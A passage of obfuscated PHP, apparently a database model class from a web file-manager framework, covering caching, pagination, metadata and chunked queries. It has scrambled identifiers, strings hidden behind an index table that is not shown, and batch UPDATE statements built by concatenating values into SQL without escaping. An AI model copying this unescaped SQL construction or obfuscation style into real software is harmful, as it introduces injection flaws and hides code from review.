cacheCallCheck($Â¯ä¤æ, $¡´„­û, $®èàğ·¸ = false) { $Ì©Ç¢º¾ = $this->cacheFunctionAlias($¡´„­û); if (!$Ì©Ç¢º¾) { return; } foreach ($Ì©Ç¢º¾ as $ÆœÜ ãò => $şßÁ€ı±) { $ÆÕÌ¶íÚ = $şßÁ€ı±[0]; $á¥ïò¹ = explode($_SERVER[„Ç©ñÎ©][50], $şßÁ€ı±[1]); if ($Â¯ä¤æ == $ÆœÜ ãò) { return $this->cacheFunctionGet($ÆœÜ ãò, $ÆÕÌ¶íÚ); } if ($®èàğ·¸ && in_array($Â¯ä¤æ, $á¥ïò¹)) { $this->cacheFunctionClear($ÆœÜ ãò, $ÆÕÌ¶íÚ); } } } public function cacheFunctionGet($ğÅÂı–ğ, $ï†øÉŠ•) { $Ïê”ËÛ¶ = $this->cacheKeyMake($ğÅÂı–ğ, $ï†øÉŠ•); $½»¦âì = Cache::get($Ïê”ËÛ¶); if (!is_array($½»¦âì)) { $½»¦âì = call_user_func_array(array($this, $ğÅÂı–ğ), array($ï†øÉŠ•, !0)); Cache::set($Ïê”ËÛ¶, $½»¦âì); } return $½»¦âì; } public function cacheFunctionClear($Ç‘¬Î ä, $Ù‰‘—ºæ) { $‹ù×şÀ° = $Ù‰‘—ºæ; if (!is_array($Ù‰‘—ºæ)) { $‹ù×şÀ° = array($Ù‰‘—ºæ); } foreach ($‹ù×şÀ° as $ÚÆë¢Ş) { $Á½“µ¹ó = $this->cacheKeyMake($Ç‘¬Î ä, $ÚÆë¢Ş); Cache::remove($Á½“µ¹ó); } } private function cacheKeyMake($Ìššê‰˜, $¡Ğ„İ») { $ù–şğ°¥ =& $_SERVER[„Ç©ñÎ©]; return get_class($this) . $ù–şğ°¥[11] . $Ìššê‰˜ . $ù–şğ°¥[370] . $¡Ğ„İ»; } protected function selectPageReset() { $›íø•õÛ =& $_SERVER[„Ç©ñÎ©]; if (isset($GLOBALS[$›íø•õÛ[371]])) { return; } $GLOBALS[$›íø•õÛ[371]] = isset($GLOBALS[$›íø•õÛ[7]][$›íø•õÛ[372]]) ? $GLOBALS[$›íø•õÛ[7]][$›íø•õÛ[372]] : !1; $GLOBALS[$›íø•õÛ[373]] = isset($GLOBALS[$›íø•õÛ[7]][$›íø•õÛ[362]]) ? $GLOBALS[$›íø•õÛ[7]][$›íø•õÛ[362]] : !1; $GLOBALS[$›íø•õÛ[7]][$›íø•õÛ[372]] = !1; $GLOBALS[$›íø•õÛ[7]][$›íø•õÛ[362]] = !1; } protected function selectPageRestore() { $¢èÍ¸Ê³ =& $_SERVER[„Ç©ñÎ©]; if (!isset($GLOBALS[$¢èÍ¸Ê³[371]])) { return; } $GLOBALS[$¢èÍ¸Ê³[7]][$¢èÍ¸Ê³[372]] = $GLOBALS[$¢èÍ¸Ê³[371]]; $GLOBALS[$¢èÍ¸Ê³[7]][$¢èÍ¸Ê³[362]] = $GLOBALS[$¢èÍ¸Ê³[373]]; if ($GLOBALS[$¢èÍ¸Ê³[7]][$¢èÍ¸Ê³[372]] === !1) { unset($GLOBALS[$¢èÍ¸Ê³[7]][$¢èÍ¸Ê³[372]]); } if ($GLOBALS[$¢èÍ¸Ê³[7]][$¢èÍ¸Ê³[362]] === !1) { unset($GLOBALS[$¢èÍ¸Ê³[7]][$¢èÍ¸Ê³[362]]); } unset($GLOBALS[$¢èÍ¸Ê³[371]]); unset($GLOBALS[$¢èÍ¸Ê³[373]]); } protected function selectPage($õ¡Ö„ÆÂ = 200, $‚ÑÁÀñç = 1) { $˜®û„ÂÈ =& $_SERVER[„Ç©ñÎ©]; global $in; $³­Š ˜É = $this->optionsValue(); $ÀÛŠöÙ = 50000; $õ¡Ö„ÆÂ = isset($in[$˜®û„ÂÈ[372]]) && $in[$˜®û„ÂÈ[372]] ? $in[$˜®û„ÂÈ[372]] : $õ¡Ö„ÆÂ; if ($õ¡Ö„ÆÂ === -1) { $in[$˜®û„ÂÈ[372]] = !1; $ÀÛŠöÙ = 100000000; $õ¡Ö„ÆÂ = $ÀÛŠöÙ; } $­Ü¹®¥ = $³­Š ˜É; $­Ü¹®¥[$˜®û„ÂÈ[374]] = array(); $õ¡Ö„ÆÂ = intval($õ¡Ö„ÆÂ); $õ¡Ö„ÆÂ = $õ¡Ö„ÆÂ <= 5 ? 5 : ($õ¡Ö„ÆÂ >= $ÀÛŠöÙ ? $ÀÛŠöÙ : $õ¡Ö„ÆÂ); $‚ÑÁÀñç = intval(isset($in[$˜®û„ÂÈ[362]]) && $in[$˜®û„ÂÈ[362]] ? $in[$˜®û„ÂÈ[362]] : $‚ÑÁÀñç); $‚ÑÁÀñç = $‚ÑÁÀñç <= 1 ? 1 : $‚ÑÁÀñç; $™¶¨Â´ï = array(); $”£íŒŠÄ = 1; if ($‚ÑÁÀñç == 1 && $”£íŒŠÄ) { $this->optionsValue($³­Š ˜É); $™¶¨Â´ï = $this->page($‚ÑÁÀñç, $õ¡Ö„ÆÂ)->select(); $â´Óö´ƒ = is_array($™¶¨Â´ï) ? count($™¶¨Â´ï) : 0; if ($â´Óö´ƒ < $õ¡Ö„ÆÂ) { $Ò¿˜¹ÙÆ = 1; } else { $this->optionsValue($­Ü¹®¥); $â´Óö´ƒ = intval($this->count()); $Ò¿˜¹ÙÆ = ceil($â´Óö´ƒ / $õ¡Ö„ÆÂ); } } else { $this->optionsValue($­Ü¹®¥); $â´Óö´ƒ = intval($this->count()); $Ò¿˜¹ÙÆ = ceil($â´Óö´ƒ / $õ¡Ö„ÆÂ); $‚ÑÁÀñç = $‚ÑÁÀñç >= $Ò¿˜¹ÙÆ ? $Ò¿˜¹ÙÆ : $‚ÑÁÀñç; $this->optionsValue($³­Š ˜É); $™¶¨Â´ï = $this->page($‚ÑÁÀñç, $õ¡Ö„ÆÂ)->select(); } if (!is_array($™¶¨Â´ï)) { $™¶¨Â´ï = array(); } if ($Ò¿˜¹ÙÆ == 1) { $â´Óö´ƒ = count($™¶¨Â´ï); } $ŞµÜ¸Ô = array($˜®û„ÂÈ[375] => array($˜®û„ÂÈ[376] => $â´Óö´ƒ, $˜®û„ÂÈ[372] => $õ¡Ö„ÆÂ, $˜®û„ÂÈ[362] => $‚ÑÁÀñç, $˜®û„ÂÈ[377] => $Ò¿˜¹ÙÆ), $˜®û„ÂÈ[378] => $™¶¨Â´ï); return $ŞµÜ¸Ô; } protected function checkLength($£µ’£®‰, $Äö¹ƒæ‚ = 0, $¦ïıİ‡· = '') { $ä°½Ñ¹µ =& $_SERVER[„Ç©ñÎ©]; $Äö¹ƒæ‚ = $Äö¹ƒæ‚ ? $Äö¹ƒæ‚ : 65536; if (!$£µ’£®‰ || strlen($£µ’£®‰) < $Äö¹ƒæ‚) { return; } $¦ïıİ‡· = $¦ïıİ‡· ? $¦ïıİ‡· . $ä°½Ñ¹µ[81] : $ä°½Ñ¹µ[12]; show_json($¦ïıİ‡· . LNG($ä°½Ñ¹µ[379]) . "\x28{$Äö¹ƒæ‚}\x29", !1); } protected function metaSet($«³èÏÀÓ, $£¥’ê÷‹ = null, $ø¯à®ã† = null) { $Ò—ğ×É =& $_SERVER[„Ç©ñÎ©]; if (!$this->tableMeta || !$«³èÏÀÓ) { return !1; } $ß»©¾×ø = $this->tableMeta[$Ò—ğ×É[380]]; $‹ê¾àÜ = $this->tableMeta[$Ò—ğ×É[381]]; $øî•ú‚³ = Model($‹ê¾àÜ); $ĞéüÉ£Ö = array($ß»©¾×ø => $«³èÏÀÓ, $Ò—ğ×É[382] => $£¥’ê÷‹); if (is_null($£¥’ê÷‹)) { return $øî•ú‚³->where(array($ß»©¾×ø => $«³èÏÀÓ))->delete(); } if (is_null($ø¯à®ã†) && is_string($£¥’ê÷‹)) { return $øî•ú‚³->where($ĞéüÉ£Ö)->delete(); } $µİ­â™º = is_array($£¥’ê÷‹) ? $£¥’ê÷‹ : array(); if (is_string($£¥’ê÷‹)) { $µİ­â™º[$£¥’ê÷‹] = $ø¯à®ã†; } $Íè‚«æú = array(); foreach ($µİ­â™º as $¦şš‹£è => $èêµª•) { if (is_null($èêµª•) && is_string($¦şš‹£è)) { $øî•ú‚³->where(array($ß»©¾×ø => $«³èÏÀÓ, $Ò—ğ×É[382] => $¦şš‹£è))->delete(); continue; } $this->checkLength($èêµª•, !1, $‹ê¾àÜ . $Ò—ğ×É[4] . $¦şš‹£è); $Íè‚«æú[] = array($ß»©¾×ø => $«³èÏÀÓ, $Ò—ğ×É[104] => $¦şš‹£è, $Ò—ğ×É[383] => $èêµª•); } $È¹Š‹  = $Ò—ğ×É[384] . $‹ê¾àÜ; CacheLock::lock($È¹Š‹ ); $øî•ú‚³->where(array($ß»©¾×ø => $«³èÏÀÓ))->addAll($Íè‚«æú, array(), !0); CacheLock::unlock($È¹Š‹ ); return !0; } public function metaGet($‹«ˆƒ”·, $×»€±«Ú = false) { $‚²øâãª =& $_SERVER[„Ç©ñÎ©]; if (!$this->tableMeta) { return array(); } $õÏéá² = $this->tableMeta[$‚²øâãª[380]]; $°Ç¼è² = Model($this->tableMeta[$‚²øâãª[381]]); if ($×»€±«Ú) { $×ñ§½³Ú = array($õÏéá² => $‹«ˆƒ”·, $‚²øâãª[104] => $×»€±«Ú); return $°Ç¼è²->where($×ñ§½³Ú)->getField($‚²øâãª[383]); } $×ñ§½³Ú = array($õÏéá² => $‹«ˆƒ”·); $ñäé¡Ê¿ = $°Ç¼è²->field($‚²øâãª[385])->where($×ñ§½³Ú)->select(); $ñäé¡Ê¿ = array_to_keyvalue($ñäé¡Ê¿, $‚²øâãª[104], $‚²øâãª[383]); return $ñäé¡Ê¿; } private function checkDataAutoHas($ÌÇ®ò±) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $áÚ‘Õ®) { if (in_array($ÌÇ®ò±, explode($_SERVER[„Ç©ñÎ©][50], $áÚ‘Õ®[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÍŸû±âë, $ĞÖ©­Ò³) { $Óä¤¢Ã =& $_SERVER[„Ç©ñÎ©]; if (!is_array($ÍŸû±âë)) { return; } foreach ($this->dataAuto as $çˆÛïÙÇ) { $¼µèšñ´ = $çˆÛïÙÇ[0]; if (!in_array($ĞÖ©­Ò³, explode($Óä¤¢Ã[50], $çˆÛïÙÇ[2]))) { continue; } switch (trim($çˆÛïÙÇ[3])) { case $Óä¤¢Ã[330]: case $Óä¤¢Ã[331]: $‚‚ş˜ì‚ = $çˆÛïÙÇ[1]; $ã·‰²ğô = isset($çˆÛïÙÇ[4]) ? (array) $çˆÛïÙÇ[4] : array(); if ($‚‚ş˜ì‚ == $Óä¤¢Ã[213] && array_key_exists($¼µèšñ´, $ÍŸû±âë)) { if (!$ÍŸû±âë[$¼µèšñ´]) { unset($ÍŸû±âë[$¼µèšñ´]); } break; } if (isset($ÍŸû±âë[$¼µèšñ´])) { array_unshift($ã·‰²ğô, $ÍŸû±âë[$¼µèšñ´]); } if ($Óä¤¢Ã[330] == $çˆÛïÙÇ[3]) { $ÍŸû±âë[$¼µèšñ´] = call_user_func_array($‚‚ş˜ì‚, $ã·‰²ğô); } else { $ÍŸû±âë[$¼µèšñ´] = call_user_func_array(array(&$this, $‚‚ş˜ì‚), $ã·‰²ğô); } break; case $Óä¤¢Ã[279]: if (isset($ÍŸû±âë[$¼µèšñ´]) && $ÍŸû±âë[$¼µèšñ´]) { $ÍŸû±âë[$¼µèšñ´] = call_user_func_array(array(&$this, $çˆÛïÙÇ[1]), array($ÍŸû±âë[$¼µèšñ´])); } break; case $Óä¤¢Ã[282]: $ÍŸû±âë[$¼µèšñ´] = $ÍŸû±âë[$çˆÛïÙÇ[1]]; break; case $Óä¤¢Ã[303]: if (isset($ÍŸû±âë[$¼µèšñ´]) && !is_string($ÍŸû±âë[$¼µèšñ´])) { $ÍŸû±âë[$¼µèšñ´] = json_encode_force($ÍŸû±âë[$¼µèšñ´]); } break; case $Óä¤¢Ã[332]: if ($ÍŸû±âë[$¼µèšñ´] === $Óä¤¢Ã[12]) { unset($ÍŸû±âë[$¼µèšñ´]); } break; case $Óä¤¢Ã[333]: $ÍŸû±âë[$¼µèšñ´] = $çˆÛïÙÇ[1]; default: break; } } if ($ĞÖ©­Ò³ == $Óä¤¢Ã[364]) { $£ÛÏ¶¿Á = strtolower($this->db->getDbType()); if (strpos($£ÛÏ¶¿Á, $Óä¤¢Ã[13]) !== 0) { return; } $Ôè×É”Ğ = $this->field(!0)->fields; $ïÁÊÇéÉ = $Ôè×É”Ğ[$Óä¤¢Ã[261]]; if (isset($Ôè×É”Ğ[$Óä¤¢Ã[260]])) { unset($ïÁÊÇéÉ[$Ôè×É”Ğ[$Óä¤¢Ã[260]]]); } foreach ($ïÁÊÇéÉ as $æ·˜õªÍ => $ĞÖ©­Ò³) { if (!isset($ÍŸû±âë[$æ·˜õªÍ])) { $ÍŸû±âë[$æ·˜õªÍ] = $Óä¤¢Ã[12]; } } } } private function dataAfterFilter(&$¾Şàº·ª) { $ŞèÂŞ‘ê =& $_SERVER[„Ç©ñÎ©]; foreach ($this->dataAuto as $‘¹²Üş) { $¿ÍÏÓ’Å = $‘¹²Üş[0]; if (!isset($¾Şàº·ª[$¿ÍÏÓ’Å])) { continue; } if (!in_array($ŞèÂŞ‘ê[366], explode($ŞèÂŞ‘ê[50], $‘¹²Üş[2]))) { continue; } switch (trim($‘¹²Üş[3])) { case $ŞèÂŞ‘ê[330]: case $ŞèÂŞ‘ê[331]: $§Ìá”Çì = isset($‘¹²Üş[4]) ? (array) $‘¹²Üş[4] : array(); array_unshift($§Ìá”Çì, $¾Şàº·ª[$¿ÍÏÓ’Å]); if (isset($‘¹²Üş[4]) && $‘¹²Üş[4] == $ŞèÂŞ‘ê[386]) { $§Ìá”Çì = array($¾Şàº·ª[$¿ÍÏÓ’Å]); } if ($ŞèÂŞ‘ê[330] == $‘¹²Üş[3]) { $¾Şàº·ª[$¿ÍÏÓ’Å] = call_user_func_array($‘¹²Üş[1], $§Ìá”Çì); } else { $¾Şàº·ª[$¿ÍÏÓ’Å] = call_user_func_array(array(&$this, $‘¹²Üş[1]), $§Ìá”Çì); } break; case $ŞèÂŞ‘ê[279]: if (isset($¾Şàº·ª[$¿ÍÏÓ’Å]) && $¾Şàº·ª[$¿ÍÏÓ’Å]) { $¾Şàº·ª[$¿ÍÏÓ’Å] = call_user_func_array(array(&$this, $‘¹²Üş[1]), array($¾Şàº·ª[$¿ÍÏÓ’Å])); } break; case $ŞèÂŞ‘ê[282]: $¾Şàº·ª[$¿ÍÏÓ’Å] = $¾Şàº·ª[$‘¹²Üş[1]]; break; case $ŞèÂŞ‘ê[303]: $—‚ªİš = $¾Şàº·ª[$¿ÍÏÓ’Å]; $¾Şàº·ª[$¿ÍÏÓ’Å] = json_decode($—‚ªİš, !0); if (is_null($¾Şàº·ª[$¿ÍÏÓ’Å])) { $¾Şàº·ª[$¿ÍÏÓ’Å] = $—‚ªİš; } break; case $ŞèÂŞ‘ê[332]: if ($¾Şàº·ª[$¿ÍÏÓ’Å] === $ŞèÂŞ‘ê[12]) { unset($¾Şàº·ª[$¿ÍÏÓ’Å]); } break; case $ŞèÂŞ‘ê[333]: $¾Şàº·ª[$¿ÍÏÓ’Å] = $‘¹²Üş[1]; break; default: break; } } } public function saveAll($àæˆÛ˜) { $–²¸ã¿… =& $_SERVER[„Ç©ñÎ©]; $¬Şò÷± = $this->tablePrefix . $this->tableName; $¶ŒèÕ = self::SQL_WHERE_IN_CHUNK; $àæˆÛ˜ = is_array($àæˆÛ˜) ? $àæˆÛ˜ : array(); $£â‘ÈÎŒ = $–²¸ã¿…[387]; $ñÔš•Õâ = 0; $¬íï—‡´ = array(); $©»‹¾¿  = count($àæˆÛ˜); for ($ÀÔòéÈ³ = 0; $ÀÔòéÈ³ < $©»‹¾¿ ; $ÀÔòéÈ³++) { $ëº¯Ú›Ç = $àæˆÛ˜[$ÀÔòéÈ³]; if (!is_array($ëº¯Ú›Ç) || count($ëº¯Ú›Ç) != 4) { continue; } $²®ó°Õè = "\125\x50\104\101\x54\x45\x20\x60{$¬Şò÷±}\x60\x20\x53\105\x54\x20{$ëº¯Ú›Ç[2]}\x20\x3d\x20\x43\x41\123\105\x20{$ëº¯Ú›Ç[0]}\40\12"; if ($ñÔš•Õâ == 0) { $£â‘ÈÎŒ = $²®ó°Õè; } $¬íï—‡´[] = $–²¸ã¿…[128] . $ëº¯Ú›Ç[1] . $–²¸ã¿…[128]; $ñÔš•Õâ++; $£â‘ÈÎŒ .= "\x20\x57\x48\105\116\x20\47{$ëº¯Ú›Ç[1]}\x27\x20\x54\x48\x45\116\40\47{$ëº¯Ú›Ç[3]}\x27\40\12"; if ($ñÔš•Õâ == $¶ŒèÕ || $ÀÔòéÈ³ == $©»‹¾¿  - 1) { $ˆÆß‘×à = implode($–²¸ã¿…[50], $¬íï—‡´); $£â‘ÈÎŒ .= "\40\x45\x4e\104\40\40\127\110\x45\x52\x45\40{$ëº¯Ú›Ç[0]}\40\111\x4e\x20\50{$ˆÆß‘×à}\x29\x20"; $this->execute($£â‘ÈÎŒ); $ñÔš•Õâ = 0; $£â‘ÈÎŒ = $²®ó°Õè; $this->chunkEventCheck(count($¬íï—‡´)); $¬íï—‡´ = array(); } } $this->chunkEventSet(); } public function saveAllEach($²ú€û³) { $€ÙŸüó¢ =& $_SERVER[„Ç©ñÎ©]; $ñ®‹›ø = $this->tablePrefix . $this->tableName; foreach ($²ú€û³ as $şÔÍ»¿Ÿ) { if (!is_array($şÔÍ»¿Ÿ) || count($şÔÍ»¿Ÿ) != 4) { continue; } $½øœ®º = $şÔÍ»¿Ÿ[0] . $€ÙŸüó¢[388] . $şÔÍ»¿Ÿ[1] . $€ÙŸüó¢[128]; $‡îŞˆåµ = $şÔÍ»¿Ÿ[2] . $€ÙŸüó¢[388] . $şÔÍ»¿Ÿ[3] . $€ÙŸüó¢[128]; $›Á’ù½“ = "\x75\160\144\141\x74\145\x20{$ñ®‹›ø}\x20\163\x65\x74\x20{$‡îŞˆåµ}\x20\167\x68\145\162\145\40{$½øœ®º}\x3b"; $this->execute($›Á’ù½“); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ãí¿¢ŠÕ = false, $©©º›Ÿ = false) { $this->_chunkEvent = $Ãí¿¢ŠÕ; $this->_chunkEventParam = $©©º›Ÿ; } private function chunkEventCheck($ÖÈÌèé) { if (!$this->_chunkEvent) { return; } $“ä õÌ® = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $“ä õÌ®[$_SERVER[„Ç©ñÎ©][389]] = $ÖÈÌèé; Hook::trigger($this->_chunkEvent, $“ä õÌ®); } public function addAll($éĞ–‡Ìû, $Æô‹“Éö = array(), $µ£³´‘¨ = false) { $­ŞÂ—” =& $_SERVER[„Ç©ñÎ©]; ignore_timeout(); $Û¬‡ä˜ = self::SQL_WHERE_IN_CHUNK; if (empty($éĞ–‡Ìû)) { $this->error = think_lang($­ŞÂ—”[280]); return !1; } $Æô‹“Éö = $this->_parseOptions($Æô‹“Éö); foreach ($éĞ–‡Ìû as $ô–â’¶³ => $Í³Ïìâ) { $éĞ–‡Ìû[$ô–â’¶³] = $this->_facade($Í³Ïìâ); $this->_beforeInsert($éĞ–‡Ìû[$ô–â’¶³], $Æô‹“Éö); } if (method_exists($this->db, $­ŞÂ—”[281])) { for ($Ù±¦¦ = 0; $Ù±¦¦ < count($éĞ–‡Ìû); $Ù±¦¦ += $Û¬‡ä˜) { $ñô÷Ñ Š = array_slice($éĞ–‡Ìû, $Ù±¦¦, $Û¬‡ä˜); if (!is_array($ñô÷Ñ Š) || count($ñô÷Ñ Š) == 0) { break; } $ê­ÊÅ¦ = $this->db->insertAll($ñô÷Ñ Š, $Æô‹“Éö, $µ£³´‘¨); $this->chunkEventCheck(count($ñô÷Ñ Š)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($éĞ–‡Ìû as $ô–â’¶³ => $Í³Ïìâ) { $ê­ÊÅ¦ = $this->db->insert($Í³Ïìâ, $Æô‹“Éö, $µ£³´‘¨); } $this->commit(); } if (!1 !== $ê­ÊÅ¦) { $æ‹şÒ•Ì = $this->getLastInsID(); if ($æ‹şÒ•Ì) { return $æ‹şÒ•Ì; } } return $ê­ÊÅ¦; } public function save($Å»ÔüºÜ = '', $¢íÓê¥‘ = array()) { $‰ĞÂù™“ =& $_SERVER[„Ç©ñÎ©]; $öÛÇº = self::SQL_WHERE_IN_CHUNK; $‚â¥£û™ = $this->optionsValue(); $Â‡¼µ = $this->findWhereField($‚â¥£û™); if (!$Â‡¼µ) { return parent::save($Å»ÔüºÜ, $¢íÓê¥‘); } $Ì‡›ª“º = 0; $…”ü§“ = $‚â¥£û™[$‰ĞÂù™“[284]][$Â‡¼µ][1]; $…”ü§“ = is_array($…”ü§“) ? $…”ü§“ : array(); $¾øúº = count($…”ü§“); for ($ŠØ˜ë» = 0; $ŠØ˜ë» < $¾øúº; $ŠØ˜ë» += $öÛÇº) { $õä±–¿Ç = array_slice($…”ü§“, $ŠØ˜ë», $öÛÇº); if (!is_array($õä±–¿Ç) || count($õä±–¿Ç) == 0) { break; } $‚â¥£û™[$‰ĞÂù™“[284]][$Â‡¼µ][1] = $õä±–¿Ç; $this->optionsValue($‚â¥£û™); $Ì‡›ª“º += parent::save($Å»ÔüºÜ, $¢íÓê¥‘); $this->chunkEventCheck(count($õä±–¿Ç)); } $this->chunkEventSet(); return $Ì‡›ª“º; } public function add($•ƒè£íÃ = '', $•ô¨Õëˆ = array(), $Œ¯Òƒñ¼ = false) { if ($this->addTaskStatus && is_array($•ƒè£íÃ)) { $this->addTaskData[] = $•ƒè£íÃ; return; } return parent::add($•ƒè£íÃ, $•ô¨Õëˆ, $Œ¯Òƒñ¼); } public function parseWhereLike($öÍÏ¼, $‘•©¦è = '', $®ßÂİª² = false, &$Ú” Å‚ = false) { $Î‰¦ÛÛˆ =& $_SERVER[„Ç©ñÎ©]; $„Ü©ú¥Ç = $GLOBALS[$Î‰¦ÛÛˆ[6]][$Î‰¦ÛÛˆ[390]]; if (!$„Ü©ú¥Ç[$Î‰¦ÛÛˆ[391]]) { return $öÍÏ¼; } if (!is_array($öÍÏ¼)) { return $öÍÏ¼; } $³•ı»´ = array(); $ä¹‡ŒÌÖ = 0; foreach ($öÍÏ¼ as $Ï¯ë·Ë => $š¹¨¼‡) { if (is_array($š¹¨¼‡) && count($š¹¨¼‡) == 2 && $š¹¨¼‡[0] == $Î‰¦ÛÛˆ[392] && is_string($š¹¨¼‡[1]) && substr($š¹¨¼‡[1], 0, 1) == $Î‰¦ÛÛˆ[393] && substr($š¹¨¼‡[1], strlen($š¹¨¼‡[1]) - 1, 1) == $Î‰¦ÛÛˆ[393]) { $Ú” Å‚ = !0; $ğóù²ƒ¼ = is_string($Ï¯ë·Ë) ? $Ï¯ë·Ë : $‘•©¦è; $œ“€Â = substr($š¹¨¼‡[1], 1, strlen($š¹¨¼‡[1]) - 2); $œ“€Â = $this->db->escapeString($œ“€Â); if (!strpos($ğóù²ƒ¼, $Î‰¦ÛÛˆ[10])) { $ğóù²ƒ¼ = $Î‰¦ÛÛˆ[394] . $ğóù²ƒ¼ . $Î‰¦ÛÛˆ[394]; } $êÆ¢Š¯ = $Î‰¦ÛÛˆ[198] . $œ“€Â . $Î‰¦ÛÛˆ[198]; $œ“€Â = str_replace(array($Î‰¦ÛÛˆ[10], $Î‰¦ÛÛˆ[395], $Î‰¦ÛÛˆ[11]), $Î‰¦ÛÛˆ[396], $œ“€Â); if ($„Ü©ú¥Ç[$Î‰¦ÛÛˆ[397]]) { $êÆ¢Š¯ = $Î‰¦ÛÛˆ[398] . $œ“€Â . $Î‰¦ÛÛˆ[399]; if ($„Ü©ú¥Ç[$Î‰¦ÛÛˆ[400]]) { $êÆ¢Š¯ = $Î‰¦ÛÛˆ[399] . $œ“€Â . $Î‰¦ÛÛˆ[398]; } } $³•ı»´[$ä¹‡ŒÌÖ] = $Î‰¦ÛÛˆ[401] . $ğóù²ƒ¼ . $Î‰¦ÛÛˆ[402] . $êÆ¢Š¯ . $Î‰¦ÛÛˆ[403]; $ä¹‡ŒÌÖ++; continue; } if (is_array($š¹¨¼‡)) { $‘•©¦è = is_string($Ï¯ë·Ë) ? $Ï¯ë·Ë : $‘•©¦è; $š¹¨¼‡ = $this->parseWhereLike($š¹¨¼‡, $‘•©¦è, !0, $Ú” Å‚); } if (is_numeric($Ï¯ë·Ë)) { $³•ı»´[$ä¹‡ŒÌÖ] = $š¹¨¼‡; $ä¹‡ŒÌÖ++; } else { $³•ı»´[$Ï¯ë·Ë] = $š¹¨¼‡; } } if ($Ú” Å‚ && !$®ßÂİª²) { } return $³•ı»´; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Èæá‘ = array()) { $¨©ÉÜ¦— =& $_SERVER[„Ç©ñÎ©]; $±Ç¹¶‰Ï = self::SQL_WHERE_IN_CHUNK; $è§³ÑÔ¡ = $this->optionsValue(); $Ó‚Â˜ÍÇ = $this->findWhereField($è§³ÑÔ¡); if (!$Ó‚Â˜ÍÇ || isset($è§³ÑÔ¡[$¨©ÉÜ¦—[301]]) || isset($è§³ÑÔ¡[$¨©ÉÜ¦—[362]])) { return parent::select($Èæá‘); } $Ğãê³ş¶ = $è§³ÑÔ¡[$¨©ÉÜ¦—[284]][$Ó‚Â˜ÍÇ][1]; $Ğãê³ş¶ = is_array($Ğãê³ş¶) ? $Ğãê³ş¶ : array(); $°«”«¥ = null; for ($ğï›êÜ = 0; $ğï›êÜ < count($Ğãê³ş¶); $ğï›êÜ += $±Ç¹¶‰Ï) { $áñø‡Š¤ = array_slice($Ğãê³ş¶, $ğï›êÜ, $±Ç¹¶‰Ï); if (!is_array($áñø‡Š¤) || count($áñø‡Š¤) == 0) { break; } $è§³ÑÔ¡[$¨©ÉÜ¦—[284]][$Ó‚Â˜ÍÇ][1] = $áñø‡Š¤; $this->optionsValue($è§³ÑÔ¡); $ú—¬ü°ù = parent::select($Èæá‘); if (!$ú—¬ü°ù) { continue; } $°«”«¥ = is_array($°«”«¥) ? $°«”«¥ : array(); $°«”«¥ = array_merge($°«”«¥, $ú—¬ü°ù); } return $°«”«¥; } public function delete($¶×·–œ = array()) { $¼¹ŞŠè‘ =& $_SERVER[„Ç©ñÎ©]; $‚Ö”ôê© = self::SQL_WHERE_IN_CHUNK; $’éå®‰ª = $this->optionsValue(); $·¼öÏã = $this->findWhereField($’éå®‰ª); if (!$·¼öÏã) { return parent::delete($¶×·–œ); } $ˆ“ğ‡á‹ = 0; $ìá”ŠĞİ = $’éå®‰ª[$¼¹ŞŠè‘[284]][$·¼öÏã][1]; $ìá”ŠĞİ = is_array($ìá”ŠĞİ) ? $ìá”ŠĞİ : array(); for ($‚­«Îá× = 0; $‚­«Îá× < count($ìá”ŠĞİ); $‚­«Îá× += $‚Ö”ôê©) { $àŒ Ï¶í = array_slice($ìá”ŠĞİ, $‚­«Îá×, $‚Ö”ôê©); if (!is_array($àŒ Ï¶í) || count($àŒ Ï¶í) == 0) { break; } $’éå®‰ª[$¼¹ŞŠè‘[284]][$·¼öÏã][1] = $àŒ Ï¶í; $this->optionsValue($’éå®‰ª); $ˆ“ğ‡á‹ += parent::delete($¶×·–œ); } return $ˆ“ğ‡á‹; } private function findWhereField($¿ù€Û×Ó) { $¿ŒüÈÆ =& $_SERVER[„Ç©ñÎ©]; $ÇÃë´æù = self::SQL_WHERE_IN_CHUNK; if (!is_array($¿ù€Û×Ó) || !is_array($¿ù€Û×Ó[$¿ŒüÈÆ[284]])) { return !1; } foreach ($¿ù€Û×Ó[$¿ŒüÈÆ[284]] as $¢ÔÜÊĞ© => $ÜîÇ€â’) { if (is_array($ÜîÇ€â’) && isset($ÜîÇ€â’[0]) && is_string($ÜîÇ€â’[0]) && strtolower($ÜîÇ€â’[0]) == $¿ŒüÈÆ[7] && is_array($ÜîÇ€â’[1]) && count($ÜîÇ€â’[1]) > $ÇÃë´æù) { ignore_timeout(); return $¢ÔÜÊĞ©; } } return !1; } public function setMasterDB($ØµÇ¬ö = true) { think_config($_SERVER[„Ç©ñÎ©][404], $ØµÇ¬ö); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\x65\155\117\160\164\x69\x6f\156"; public $field = array(); public function listData($ê®Òè½û = false, $ÒÍêÜë = "\155\x6f\x64\151\x66\171\124\x69\x6d\x65", $ï”å—¨İ = false) { $ÚÊ–š = Model($this->modelType)->get(!1, $this->optionType, !0); $åÁ«©İî = array_values($ÚÊ–š); if ($åÁ«©İî && $åÁ«©İî[0] && !is_array($åÁ«©İî[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÚÊ–š = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÚÊ–š) { return $ê®Òè½û ? null : array(); } if (!$ê®Òè½û) { $ÚÊ–š = array_filter(array_values($ÚÊ–š)); return array_sort_by($ÚÊ–š, $ÒÍêÜë, $ï”å—¨İ); } return $ÚÊ–š[$_SERVER[„Ç©ñÎ©][405] . $ê®Òè½û]; } public function insert($›²àŸ‚) { $ï†¡°Ê =& $_SERVER[„Ç©ñÎ©]; $›²àŸ‚ = array_field_key($›²àŸ‚, $this->field); $ÔÔğÍ¥Æ = Model($this->modelType)->get($ï†¡°Ê[406], $this->optionType . $ï†¡°Ê[407]); $ÔÔğÍ¥Æ = $ÔÔğÍ¥Æ ? $ÔÔğÍ¥Æ : 0; 